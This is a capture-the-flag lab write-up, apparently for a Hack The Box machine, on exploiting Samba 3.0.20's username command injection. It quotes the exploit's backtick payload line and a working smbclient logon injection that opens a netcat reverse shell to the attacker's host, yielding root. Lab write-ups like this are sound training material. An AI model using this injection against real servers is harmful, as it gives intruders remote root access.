# Recon

- I'v found that there is 2 open ports with samba service!
1.  139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
2.  445/tcp  open              syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

- As usual, let's check for vulnerabilities in this Samba version, but this time, we'll use searchsploit tool.
![[Pasted image 20231107214258.png]]

-  so as we can see, we found a code execution vulnerability in the same samba version 3.0.20.
-  let's use the flag -x in searchsploit to examine the script, and do things manually as usual.
![[Pasted image 20231107214530.png]]
![[Pasted image 20231107215023.png]]
-  so as we can see in the payload line : 
  ```
  username = "/=`nohup " + payload.encoded + "`"
  ```
  -  so we will later tweak it a bit to be compatible with our use case.
  1. the nohup used to run commands in background, allowing it to continue running even after you log out of the system.
  2. any command inside backticks char's "\`"  will allow as to use the output of one command as input for another like $().
   ![[Pasted image 20231107220445.png]]

- Let's utilize the smbmap tool to identify any shared files with accessible permissions, and then try to logon within the samba server and trigger the vuln...
![[Pasted image 20231107201954.png]]

- as we can see in the screenshot above, we have READ and WRITE permession to tmp directory and with a comment saying oh noes! so let's check it out.
- While attempting to connect to the "tmp" directory via Samba, I encountered a bug, as illustrated in the screenshot below.
![[Pasted image 20231107222637.png]]
- If you encounter this issue, here's how to resolve it and an explanation for why it happened on this Link :   ``` https://forum.hackthebox.com/t/having-smb-enum-issues-read-this/2369```
 1. Open the smb.conf file located at /etc/samba/smb.conf. If it doesn't exist, create it, and then open it with your preferred text editor.
    ![[Pasted image 20231107223106.png]]
 2. then add this line and save quit. 
    ```
    client min protocol=NT1
    ```
  ![[Pasted image 20231107223418.png]]

  ---
# Exploitation


  - and now here we are connection established successfully :
    ![[Pasted image 20231107223608.png]]
 - Now, let's see if we can execute a command to prompt for input credentials, which will help us inject our payload into the username input.
   ![[Pasted image 20231107224045.png]]
   -  As shown in the screenshot above, we used the 'help' command to display a list of available commands, and subsequently, we identified the 'logon' command as the means to reach our desired objective.
![[Pasted image 20231107231613.png]]


- so now the plan is to use the nohup command and the backticks to get shell on the machine in username input filed with a random password when asked.
```
  logon "/=`nohup nc -e /bin/bash 10.10.16.7 443`"
```


- We employed the 'nc' command to establish a connection back to our attacker machine via port 443 with -e flag to execute cmd /bin/bash on the victim machine and send connection back to us, so we need to listen from attacker machine.
![[Pasted image 20231107225645.png]]

  - Hoorayy!  here we are Root :D 
    ![[Pasted image 20231107230824.png]]
- no we just need to upgrade the shell with python and find the 2 flags user & root !
![[Pasted image 20231107233127.png]]

- using find command to get the flags : 
![[Pasted image 20231107233443.png]]



